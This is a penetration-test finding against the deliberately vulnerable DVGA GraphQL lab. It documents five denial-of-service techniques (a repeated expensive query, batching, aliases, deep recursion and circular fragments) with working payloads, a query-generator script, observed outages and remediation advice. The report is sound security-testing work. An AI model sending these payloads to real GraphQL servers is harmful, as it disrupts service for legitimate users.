# DVGA-012 — Denial of Service via Multiple Resource-Exhaustion Techniques

**Severity:** 

High

CVSS v3.1 Score: 7.5 (High)

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

## Overall CVSS Calculation

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
CVSS Base Score:          7.5
Impact Subscore:          3.6
Exploitability Subscore:  3.9
CVSS Temporal Score:      NA
CVSS Environmental Score: NA
Modified Impact Subscore: NA
Overall CVSS Score:       7.5

**CWE:** CWE-400 — Uncontrolled Resource Consumption

**OWASP Mapping:** OWASP API Security Top 10 — API4:2023 Unrestricted Resource Consumption

---

## Description

During testing of the DVGA GraphQL API, I found several different ways to consume a significant amount of server-side resources through specially crafted GraphQL queries.

The main issue is that the application does not appear to have sufficient GraphQL resource controls such as query-depth limits, query-cost analysis, batching limits, alias limits, or protection against circular fragment processing.

The following techniques were successfully tested and resulted in noticeable performance degradation or application unavailability:

* Resource-intensive `systemHealth` query
* GraphQL batching
* GraphQL alias-based attack
* Deeply nested GraphQL queries
* Circular fragment attack

I also tested field duplication with a large number of repeated fields. However, the application handled 1,000 duplicated fields in approximately 7 seconds, which was not enough to demonstrate a reliable denial-of-service condition. Therefore, field duplication is not treated as a confirmed DoS vector in this finding.

All of the confirmed techniques have the same overall impact: they can force the GraphQL server to perform excessive processing and consume server resources, eventually affecting application availability.

---

## Affected Endpoint

```text
POST /graphql
```

## Affected Operations

```text
systemHealth
systemUpdate
pastes
readAndBurn
```

---

# 1. Resource-Intensive `systemHealth` Query

I first tested the `systemHealth` query because it takes a noticeable amount of time to return a response.

### Payload

```graphql
query systemHealth {
    systemHealth
}
```

The query took a minimum of approximately **30 seconds** to respond.

I then used Burp Suite Intruder to send the same query repeatedly. Intruder was configured with **Null payloads** and a total of **100 requests**.

During the attack, the application continuously remained in a loading/reloading state. This was observed both through the ngrok-forwarded URL and directly through the localhost instance.

A screen recording of approximately **3 minute 8 seconds** was captured around showing the application continuously loading while the Intruder attack was running.

### Impact

Because the `systemHealth` operation already takes a significant amount of time to process, repeatedly sending the query can consume server resources and prevent legitimate requests from being processed normally.

---

# 2. GraphQL Batch Query Attack

I also tested GraphQL batching to see whether multiple operations could be submitted together in a single HTTP request and processed by the application without an effective query-cost restriction.

Graphene disables batching by default, and I wanted to check how the DVGA application handled a large number of GraphQL operations submitted together.

The following query was used as the base request:

```json
{"query":"query systemUpdate {\r\n    systemUpdate\r\n}"}
```

I then created a JSON array containing **100 copies of the same query** and submitted them together as one request.

During the test, between approximately **10:06 and 10:08**, the site was clearly reloading and becoming unavailable. This was observed both through the ngrok-forwarded URL and directly through localhost.

A screen recording of approximately **1 minute 8 seconds** was captured showing this behaviour.

At around **10:13**, another approximately **31 second** recording was captured showing that the application was still unavailable.

### Impact

Submitting a large number of GraphQL operations in a single request can significantly increase the amount of work performed by the server.

Without appropriate batching restrictions or query-cost controls, an attacker can use this behaviour to consume server resources and affect application availability.

---

# 3. GraphQL Alias-Based Attack

I also tested GraphQL aliases because aliases allow the same field to be requested multiple times under different names.

A query containing **100 aliases** of the `systemUpdate` field was created.

### Payload

```graphql
query {
    q1: systemUpdate
    q2: systemUpdate
    q3: systemUpdate
    ...
}
```

The complete 100-alias query is stored in the evidence directory.

When the request was sent, the site became unavailable in a similar way to the previous resource-exhaustion tests.

A screen recording of approximately **1 minute** was captured around **10:38**, showing the application becoming unavailable during the test.

### Impact

GraphQL aliases can be used to request the same field multiple times within one operation. When expensive fields are repeatedly executed through aliases, the amount of work performed by the server can increase significantly.

Without an appropriate alias limit or query-cost control, this can be abused to consume server resources and affect application availability.

---

# 4. Deep GraphQL Recursion

I then tested deep GraphQL recursion.

While reviewing the GraphQL schema, ZAP identified a **GraphQL Circular Type Reference** involving the following relationship:

```text
PasteObject → OwnerObject → PasteObject
```

This relationship allows the response to repeatedly move between `PasteObject` and `OwnerObject`.

### Initial Recursive Query

```graphql
query{
  pastes{
    owner{
      pastes{
        owner{
          pastes{
            owner{
              pastes{
                owner{
                  id
                  name
                }
              }
            }
          }
        }
      }
    }
  }
}
```

The response showed the same nested relationship being repeatedly followed:

```text
pastes → owner → pastes → owner
```

The response became very deeply nested and contained a long repeated structure.

After confirming that this relationship could be recursively followed, I generated a much deeper query to check whether the application enforced any query-depth restrictions.

A **1,000-level deep GraphQL query** was generated using `depth-1000.py`.

The generated query was approximately **3935 KB** in size.

The script and generated payload are included in the evidence directory.

When the 1,000-level query was sent, the application became unavailable from both localhost and the forwarded ngrok host.

A screen recording of approximately **1 minute 12 seconds** was captured around **9:46** showing the application becoming unavailable.

During the same test, the ZAP progress also appeared to freeze.

### Impact

Deeply nested GraphQL queries can force the application to repeatedly resolve nested relationships and build very large response structures.

Without an effective maximum query-depth or query-cost restriction, an attacker can submit excessively deep queries and consume significant CPU, memory, processing time, and other server resources.

---

# 5. Circular Fragment Attack

Finally, I tested circular GraphQL fragments.

The `readAndBurn` operation returns a `PasteObject`, which allowed me to test whether fragments could recursively reference each other.

### Normal Query

```graphql
query readAndBurn {
    readAndBurn(id: Int) {
        burn
        content
        id
        ipAddr
        owner {
            id
            name
            paste
            pastes
        }
        ownerId
        public
        title
        userAgent
    }
}
```

I then created two fragments where each fragment references the other.

### Circular Fragment Payload

```graphql
query readAndBurn {
    readAndBurn(id: 1) {
        ...Happy
}}

fragment Happy on PasteObject{
    burn
    content
    id
    ipAddr
    ...Sad
}

fragment Sad on PasteObject{
    burn
    content
    id
    ipAddr
    ...Happy
}
```

Here, the `Happy` fragment references `Sad`, while `Sad` references `Happy`, creating a circular fragment relationship.

After sending the request, the application became unavailable on both localhost and the ngrok-forwarded endpoint.

Burp Suite returned:

```http
HTTP/2 503 Service Unavailable
Content-Type: text/plain
Date: Wed, 02 Sep 2026 04:03:27 GMT

ngrok gateway error
The server returned an invalid or incomplete HTTP response.

ERR_NGROK_3004
```

A subsequent request returned:

```http
HTTP/2 502 Bad Gateway
Content-Type: text/plain
Date: Wed, 02 Sep 2026 04:03:29 GMT

ngrok gateway error
Traffic successfully made it to the ngrok agent, but the agent failed to establish a connection to the upstream web service at localhost:5013.

ERR_NGROK_8012
```

A screen recording of approximately **1 minute 8 seconds** was captured during the test.

The circular-fragment payload and the observed responses are included in the evidence directory.

### Impact

Circular fragment structures can result in excessive GraphQL processing if they are not properly detected and rejected during validation.

In this test, the application became unavailable after the circular fragment request, and the ngrok agent was no longer able to establish a connection to the upstream DVGA service.

---

# Field Duplication Testing

I also tested field duplication to determine whether repeatedly requesting the same fields could produce another resource-exhaustion condition.

I manually nested and duplicated fields in the `pastes` query and then used a Python script to generate a much larger payload containing **1,000 repeated field blocks**.

The generator used the following field template:

```python
def generate_duplicate_fields(field_block, count=1000):
    duplicated_fields = "\n".join([field_block] * count)
    full_query = f"""query pastes {{
  pastes(public: true) {{
    burn
    content
    id
    ipAddr
    owner {{
      id
      name
      pastes {{
{duplicated_fields}
      }}
    }}
  }}
}}"""
    return full_query

field_template = """        burn
        content
        id
        ipAddr
        public
        title
        userAgent"""

query_output = generate_duplicate_fields(field_template, 1000)

with open("duplicate_fields_query.graphql", "w") as f:
    f.write(query_output)

print("Generated query written to duplicate_fields_query.graphql")
```

The resulting 1,000-field query returned a response in approximately **7 seconds**.

This was not enough to demonstrate a reliable denial-of-service condition.

I also tested the `systemUpdate` field with duplicated fields. The application did not show the same level of impact, which suggests that some form of GraphQL field de-duplication or related protection may already be present.

Because the observed impact was not sufficient, field duplication is **not included as a confirmed DoS technique** in this finding.

---

# Overall Impact

The testing showed that the DVGA GraphQL API can be stressed through several different GraphQL resource-exhaustion techniques.

The confirmed techniques include:

1. Resource-intensive `systemHealth` queries
2. GraphQL batching
3. Alias-based execution
4. Deep GraphQL recursion
5. Circular fragments

These techniques can cause the server to perform significantly more work than a normal GraphQL request.

Depending on the request volume and server resources available, exploitation can result in:

* High CPU usage
* Increased memory consumption
* Long-running requests
* Requests remaining pending for extended periods
* Slow application responses
* Application unavailability
* Denial of service for legitimate users

The main issue is the lack of sufficient GraphQL-specific resource controls around query execution.

---

# Remediation

The application should implement GraphQL-specific protections against excessive resource consumption.

Recommended controls include:

1. **Implement maximum query depth**

   Set a reasonable maximum nesting depth and reject queries that exceed it.

2. **Implement query complexity/cost analysis**

   Assign costs to GraphQL fields and reject operations whose calculated complexity exceeds a safe threshold.

3. **Limit GraphQL batching**

   Restrict the number of operations that can be submitted in a single HTTP request.

4. **Limit aliases**

   Restrict the number of aliases that can be used within a single GraphQL operation.

5. **Reject circular fragments**

   Ensure circular fragment structures are detected during GraphQL validation and rejected before execution.

6. **Apply execution timeouts**

   Prevent expensive GraphQL operations from running indefinitely.

7. **Apply rate limiting**

   Rate-limit requests to `/graphql`, especially for unauthenticated or low-privileged users.

8. **Restrict expensive operations**

   Operations such as `systemHealth` should be protected appropriately if they are not intended to be publicly accessible.

9. **Monitor GraphQL resource consumption**

   Monitor request duration, CPU usage, memory usage, concurrent GraphQL operations, and abnormal query patterns to detect and contain resource-exhaustion attacks.

---

# Evidence

All requests, responses, payloads, screenshots, scripts, and screen recordings related to this finding are stored under:

```text
evidence/DVGA-012-Denial-of-Service-via Multiple-Resource-Exhaustion-Techniques/
```

The evidence covers the resource-intensive query, batch query, alias-based attack, deep recursion, circular fragment attack, and field-duplication testing described above.

---

# References

* CWE-400 — Uncontrolled Resource Consumption
* OWASP API Security Top 10 — API4:2023 Unrestricted Resource Consumption
* OWASP GraphQL Security Guidance — Query Depth and Complexity Controls
